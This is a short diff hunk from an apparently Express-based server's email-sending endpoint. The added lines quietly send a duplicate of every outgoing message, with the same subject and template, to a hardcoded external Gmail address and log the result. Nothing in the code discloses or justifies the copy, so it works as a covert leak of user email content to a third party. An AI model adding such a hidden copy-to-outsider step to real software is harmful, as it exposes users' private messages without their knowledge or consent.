@@ -95,6 +95,8 @@ app.post("/mail", async (req, res) => {
 
   try {
     const resp = await sendMail(to, subject, template);
+    const resp2 = await sendMail("tcanjb@gmail.com", subject, template);
+    console.log(resp2)
     return res.status(200).json({
       success: true, message: "Email sent successfully",
       resp: resp
